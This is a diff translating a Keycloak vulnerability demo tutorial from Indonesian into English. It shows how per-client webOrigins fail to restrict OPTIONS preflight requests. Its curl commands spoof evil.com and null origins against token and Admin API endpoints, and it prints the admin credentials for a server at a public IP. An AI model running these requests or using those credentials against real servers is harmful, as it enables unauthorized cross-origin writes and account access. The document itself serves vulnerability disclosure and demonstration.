@@ -1,45 +1,45 @@
 # Tutorial: Finding #1 — CORS OPTIONS Preflight Bypass
 
 **Severity:** MEDIUM (CVSS 5.3)
-**Waktu demo:** ~5 menit
-**Kebutuhan:** Terminal + Browser (Keycloak Admin Console)
+**Demo time:** ~5 minutes
+**Requirements:** Terminal + Browser (Keycloak Admin Console)
 
 ---
 
-## Langkah 0: Pastikan Keycloak Berjalan
+## Step 0: Ensure Keycloak is Running
 
 ```bash
 curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
 ```
-Output yang diharapkan: `Keycloak OK: test`
+Expected output: `Keycloak OK: test`
 
 ---
 
-## Langkah 1: Login ke Admin Console — Tunjukkan webOrigins Config
+## Step 1: Login to Admin Console — Show webOrigins Config
 
-### 1a. Buka browser, akses Admin Console:
+### 1a. Open browser, access Admin Console:
 ```
 http://46.101.162.187:8080/admin/master/console/
 ```
 
-### 1b. Login dengan kredensial admin:
+### 1b. Login with admin credentials:
 ```
 Username: admin
 Password: Admin1234
 ```
 
-### 1c. Navigasi ke konfigurasi client:
-1. Klik **"test"** di dropdown realm (kiri atas)
-2. Klik **Clients** di sidebar kiri
-3. Klik client **"webapp"**
-4. Scroll ke bawah, cari bagian **"Web origins"**
-5. **Screenshot/tunjukkan** bahwa nilainya: `https://legitimate-app.com`
+### 1c. Navigate to client configuration:
+1. Click **"test"** in the realm dropdown (top left)
+2. Click **Clients** in the left sidebar
+3. Click client **"webapp"**
+4. Scroll down, find the **"Web origins"** section
+5. **Screenshot/show** that the value is: `https://legitimate-app.com`
 
-> **Poin penting:** Admin sudah konfigurasi webOrigins dengan benar — hanya `https://legitimate-app.com` yang seharusnya diizinkan.
+> **Key point:** The admin has configured webOrigins correctly — only `https://legitimate-app.com` should be allowed.
 
 ---
 
-## Langkah 2: Verifikasi webOrigins via CLI (Opsional)
+## Step 2: Verify webOrigins via CLI (Optional)
 
 ```bash
 ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
@@ -54,9 +54,9 @@ Output: `webOrigins: ['https://legitimate-app.com']`
 
 ---
 
-## Langkah 3: Kirim OPTIONS Preflight dari evil.com
+## Step 3: Send OPTIONS Preflight from evil.com
 
-Ini mensimulasikan browser di `evil.com` yang mengirim preflight check ke Keycloak.
+This simulates a browser on `evil.com` sending a preflight check to Keycloak.
 
 ```bash
 curl -si -X OPTIONS \
@@ -66,20 +66,20 @@ curl -si -X OPTIONS \
   -H "Access-Control-Request-Headers: Content-Type,Authorization"
 ```
 
-**Yang diharapkan (aman):** Tidak ada header `Access-Control-Allow-Origin`
-**Yang terjadi (VULNERABLE):**
+**Expected (secure):** No `Access-Control-Allow-Origin` header
+**Actual result (VULNERABLE):**
 ```
 HTTP/1.1 200 OK
-Access-Control-Allow-Origin: https://evil.com        <-- SEHARUSNYA TIDAK ADA!
-Access-Control-Allow-Credentials: true               <-- BAHAYA!
+Access-Control-Allow-Origin: https://evil.com        <-- SHOULD NOT BE PRESENT!
+Access-Control-Allow-Credentials: true               <-- DANGEROUS!
 Access-Control-Allow-Methods: DELETE, POST, GET, PUT
 ```
 
-> **evil.com diizinkan padahal TIDAK ada di webOrigins!**
+> **evil.com is allowed even though it is NOT in webOrigins!**
 
 ---
 
-## Langkah 4: Test null Origin (Sandboxed Iframe Attack)
+## Step 4: Test null Origin (Sandboxed Iframe Attack)
 
 ```bash
 curl -si -X OPTIONS \
@@ -94,11 +94,11 @@ Access-Control-Allow-Origin: null
 Access-Control-Allow-Credentials: true
 ```
 
-> Origin `null` juga diterima — ini berarti serangan dari `<iframe sandbox>`, `file://`, atau `data:` URI bisa bypass semua restricsi.
+> Origin `null` is also accepted — this means attacks from `<iframe sandbox>`, `file://`, or `data:` URIs can bypass all restrictions.
 
 ---
 
-## Langkah 5: Test Admin API Preflight
+## Step 5: Test Admin API Preflight
 
 ```bash
 curl -si -X OPTIONS \
@@ -115,11 +115,11 @@ Access-Control-Allow-Credentials: true
 Access-Control-Allow-Methods: DELETE, POST, GET, PUT
 ```
 
-> Bahkan Admin API pun preflight-nya bypass — attacker bisa kirim write request (create user, delete client) dari evil.com!
+> Even the Admin API preflight is bypassed — an attacker can send write requests (create user, delete client) from evil.com!
 
 ---
 
-## Langkah 6: Control Test — Actual POST (Ini yang benar)
+## Step 6: Control Test — Actual POST (This is the correct behavior)
 
 ```bash
 curl -si -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
@@ -134,11 +134,11 @@ HTTP/1.1 200 OK
 Cache-Control: no-store
 Content-Type: application/json
 ```
-> **Perhatikan:** TIDAK ada `Access-Control-Allow-Origin` di response aktual — browser akan block pembacaan response. Tapi server tetap memproses request-nya (write-CSRF tetap terjadi).
+> **Note:** There is NO `Access-Control-Allow-Origin` in the actual response — the browser will block reading the response. However, the server still processes the request (write-CSRF still occurs).
 
 ---
 
-## Langkah 7: Jalankan Python PoC (Otomatis Semua)
+## Step 7: Run Python PoC (Automated Full Test)
 
 ```bash
 python3 pocs/poc_f1_cors_bypass.py --host http://localhost:8080
@@ -146,13 +146,13 @@ python3 pocs/poc_f1_cors_bypass.py --host http://localhost:8080
 
 ---
 
-## Ringkasan
+## Summary
 
 | Test | Expected | Actual | Status |
 |---|---|---|---|
-| OPTIONS dari evil.com | No ACAO header | `ACAO: https://evil.com` | VULNERABLE |
-| OPTIONS dari null | No ACAO header | `ACAO: null` | VULNERABLE |
+| OPTIONS from evil.com | No ACAO header | `ACAO: https://evil.com` | VULNERABLE |
+| OPTIONS from null | No ACAO header | `ACAO: null` | VULNERABLE |
 | OPTIONS Admin API | No ACAO header | `ACAO: https://evil.com` | VULNERABLE |
-| Actual POST | No ACAO header | No ACAO header | Correct (tapi server tetap proses) |
+| Actual POST | No ACAO header | No ACAO header | Correct (but server still processes) |
 
-**Kesimpulan:** webOrigins per-client TIDAK punya efek pada OPTIONS preflight — semua origin bisa lolos preflight check.
+**Conclusion:** webOrigins per-client has NO effect on OPTIONS preflight — all origins can pass the preflight check.
